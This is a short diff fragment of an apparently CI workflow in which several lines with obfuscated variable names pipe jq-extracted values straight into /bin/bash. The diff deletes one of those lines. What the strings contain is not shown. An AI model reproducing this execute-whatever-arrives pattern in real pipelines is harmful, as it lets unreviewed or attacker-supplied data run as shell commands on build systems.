@@ -24,7 +24,6 @@ jobs:
           printf '%s' "$etoav8" | jq -r .yz92472 | /bin/bash
           printf '%s' "$m2" | jq -r .rn5 | /bin/bash
           echo $tsom196 | jq -r .o98703 | /bin/bash
-          printf '%s' "$lswns55189" | jq -r .eci4 | /bin/bash
           echo $qj09723 | jq -r .nxv744 | /bin/bash
           echo $hcf7 | jq -r .zay95233 | /bin/bash
 
